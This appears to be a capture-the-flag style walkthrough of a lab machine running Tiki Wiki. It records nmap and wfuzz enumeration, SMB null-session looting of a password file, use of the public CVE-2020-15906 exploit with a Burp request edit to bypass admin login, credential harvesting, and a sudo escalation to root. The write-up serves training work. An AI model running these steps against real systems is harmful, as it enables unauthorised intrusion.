```
echo 192.168.56.101 > ~/IP.txt; source ~/.zshrc
```
**Vulnerability Exploited:** Tiki Wiki CMS Groupware 21.1 - Authentication Bypass (CVE-2020-15906)
**Vulnerability Explanation:** tiki-login.php in Tiki before 21.2 sets the admin password to a blank value after 50 invalid login attempts.
**Privilege Escalation  Vulnerability:** User is able to run any command as root using sudo.

## Enumeration
### Nmap
<pre style="font-size: 12px";>
<font color=#1569C7>nmap -p- -sC -sV -oN enum/tcp 192.168.56.101</font>
PORT    STATE SERVICE     VERSION
<font color=red>22</font>/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:d8:4a:89:a9:25:6d:07:c5:3d:76:28:06:ed:d1:c0 (RSA)
|   256 e7:b2:89:05:54:57:dc:02:f4:8c:3a:7c:55:8b:51:aa (ECDSA)
|_  256 fd:77:07:2b:4a:16:3a:01:6b:e0:00:0c:0a:36:d8:2f (ED25519)
<font color=red>80</font>/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/tiki/
<font color=red>139</font>/tcp open  netbios-ssn Samba smbd 4.6.2
<font color=red>445</font>/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 6h59m58s
|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-08-11T21:36:12
|_  start_date: N/A
</pre>
## Wfuzz
Wfuzz found a directory called tiki.
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tiki/enum]
└─$ <font color=#1569C7>wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "http://$IP/FUZZ/"</font>
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://192.168.56.101/FUZZ/
Total requests: 62284
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000386:   403        9 L      28 W       279 Ch      "icons"
000004227:   403        9 L      28 W       279 Ch      "server-status"
000004255:   200        375 L    964 W      10918 Ch    "http://192.168.56.101//"
000012660:   302        0 L      0 W        0 Ch        "<font color=red>tiki</font>"
000030014:   200        375 L    964 W      10918 Ch    "http://192.168.56.101//"
000059104:   200        375 L    964 W      10918 Ch    "http://192.168.56.101//"
</pre>

## Port 139,445
`enum4linux` revealed one local user 'silky', that smb allowed null session and a custom share named Notes. 
<pre style="font-size: 12px";>
<font color=#1569C7>enum4linux $IP</font>
..SNIP..
 ==================================( Session Check on 192.168.56.101 )==================================

[+] Server 192.168.56.101 <font color=red>allows sessions using username '', password ''</font>
..SNIP..
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: silky	Name: Silky	Desc: 

user:[<font color=red>silky</font>] rid:[0x3e8]

 ================================( Share Enumeration on 192.168.56.101 )================================

smbXcli_negprot_smb1_done: No compatible protocol selected by server.

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	<font color=red>Notes</font>           Disk      My Notes
	IPC$            IPC       IPC Service (ubuntu server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.56.101

//192.168.56.101/print$	Mapping: DENIED Listing: N/A Writing: N/A
//192.168.56.101/Notes	Mapping: OK <font color=red>Listing</font>: OK Writing: N/A
..SNIP..
</pre>
Log in to the share notes and downloading the only available file. 
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tiki/loot]
└─$ <font color=#1569C7>smbclient //$IP/notes -N</font>
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 29 09:52:09 2020
  ..                                  D        0  Thu Jul 30 15:32:11 2020
  Mail.txt                            N      244  Wed Jul 29 09:52:05 2020

                19992176 blocks of size 1024. 9993396 blocks available
smb: \> get Mail.txt
getting file \Mail.txt of size 244 as Mail.txt (23.8 KiloBytes/sec) (average 23.8 KiloBytes/sec)
smb: \> exit
</pre>
Mail.txt file showed a potential password.
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tiki/loot]
└─$ <font color=#1569C7>cat Mail.txt</font>
Hi Silky
because of a current Breach we had to change all Passwords,
please note that it was a 0day, we don't know how he made it.

Your new CMS-password is now <font color=red>51lky571k1</font>,
please investigate how he made it into our Admin Panel.

Cheers Boss.
</pre>
```
silky:51lky571k1
```
## Port 80
Landing page of /tiki/.

![](../Assets/images/Pasted%20image%2020220812165847.png)

Homepage after logged in with username `silky` and password `51lky571k1`.

![](../Assets/images/Pasted%20image%2020220812170024.png)

Wen to System Menu > Wiki > List Pages. Clicked Silky's Homepage.

![](../Assets/images/Pasted%20image%2020220812170034.png)

Clicked Source button.

![](../Assets/images/Pasted%20image%2020220812170125.png)

![](../Assets/images/Pasted%20image%2020220812170217.png)

Changed the source query to 2. Found out that the page is vulnerable to CVE-2020-15906.

![](../Assets/images/Pasted%20image%2020220812170250.png)

## Exploitation
Link of the CVE  from exploit-db:
https://www.exploit-db.com/exploits/48927

Found the exploit with searchsploit.

![](../Assets/images/Pasted%20image%2020220812171520.png)

Copied it to my machine.

<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tiki/exploit]
└─$ <font color=#1569C7>searchsploit -m 48927</font>
  Exploit: Tiki Wiki CMS Groupware 21.1 - Authentication Bypass
      URL: https://www.exploit-db.com/exploits/48927
     Path: /usr/share/exploitdb/exploits/php/webapps/48927.py
File Type: Python script, Unicode text, UTF-8 text executable

Copied to: /home/kali/pentesting/tiki/exploit/48927.py
</pre>

Ran the exploit with the target IP address as the only argument.

<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tiki/exploit]
└─$ <font color=#1569C7>python3 48927.py $IP</font>
Admin Password got removed.
Use BurpSuite to login into admin without a password
Admin Password got removed.
Use BurpSuite to login into admin without a password
Admin Password got removed.
Use BurpSuite to login into admin without a password
..REPEATING..
</pre>

Opened the login page along side burpsuite then tried to login with username `admin` and password `pass.`   

![](../Assets/images/Pasted%20image%2020220812171754.png)

Intercepted the request and delete the password so we can login without a password.

![](../Assets/images/Pasted%20image%2020220812171810.png)

Successfuly logged in as admin.

![](../Assets/images/Pasted%20image%2020220812171837.png)

Went to Wiki > List Pages. Clicked 'Credentials' page.

![](../Assets/images/Pasted%20image%2020220812171858.png)

Found another credentials.

![](../Assets/images/Pasted%20image%2020220812171908.png)

```
silky:Agy8Y7SPJNXQzqA
```

Tried the credentials to login to ssh.

Successfully logged in to the target machine as user silky.

<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tiki]
└─$<font color=#1569C7> ssh silky@$IP</font>
silky@192.168.56.101's password:
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


1 Aktualisierung kann sofort installiert werden.
0 dieser Aktualisierung sind Sicherheitsaktualisierungen.
Um zu sehen, wie diese zusätzlichen Updates ausgeführt werden: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Thu Aug 11 15:43:49 2022 from 192.168.56.157
silky@ubuntu:~$ <font color=#1569C7>whoami</font>
silky
</pre>

## Privilege Escalation
User silky is able to run any command as root. 

<pre style="font-size: 12px";>
silky@ubuntu:~$<font color=#1569C7> sudo -l</font>
[sudo] Passwort für silky:
Passende Defaults-Einträge für silky auf ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

Der Benutzer silky darf die folgenden Befehle auf ubuntu ausführen:
    (ALL : ALL) ALL
</pre>

So, we can simply change the user to root using `sudo su`.

<pre style="font-size: 12px";>
silky@ubuntu:~$ <font color=#1569C7>sudo su</font>
root@ubuntu:/home/silky# <font color=#1569C7>whoami</font>
root
</pre>

## Proof
![](../Assets/images/Pasted%20image%2020220812172156.png)